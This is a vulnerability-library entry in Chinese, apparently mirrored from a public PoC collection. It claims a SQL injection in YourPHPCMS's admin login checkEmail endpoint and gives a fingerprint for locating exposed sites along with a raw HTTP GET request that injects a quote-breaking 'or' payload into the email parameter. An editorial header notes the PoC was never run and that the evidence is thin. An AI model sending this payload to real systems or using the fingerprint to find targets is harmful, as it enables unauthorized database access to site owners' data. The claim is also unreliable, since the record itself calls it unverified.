---
source: "wy876 漏洞文库"
product: "YourPHPCMS/Admin Login"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "YourPHPCMSlogin_checkEmail存在sql注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：无版本，未明确管理员登录端点是否需认证"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-ac3605814f79af61ce9e3cec"
entity_id: "ve-ac3605814f79af61ce9e3cec"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：无版本，未明确管理员登录端点是否需认证

代码与实验材料：单GET、Host空、混合引号or1=2，无响应对照

来源证据范围：wy876/语雀转载，无官方来源

- **适用与权限边界（1）**：缺SQL注入可观察证据；依据：无基线、真条件或数据库错误，仅一个请求。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **适用与权限边界（2）**：CMS实体误放语言目录；依据：实际Admin/Login/checkEmail业务接口，不是PHP漏洞。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# YourPHPCMS login_checkEmail存在sql注入漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.84);">YourPHPCMS login_checkEmail存在sql注入漏洞</font>

# <font style="color:rgba(0, 0, 0, 0.84);">二、影响版本</font>
+ YourPHPCMS

# 三、资产测绘
```rust
header="YP_onlineid"
```


# 四、漏洞复现
```rust
GET /index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=-69710348@nwcrb.com'+or+'1'='2" HTTP/1.1
Host: 
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate, br, zstd
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/edbg83z8v9qn2mic>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
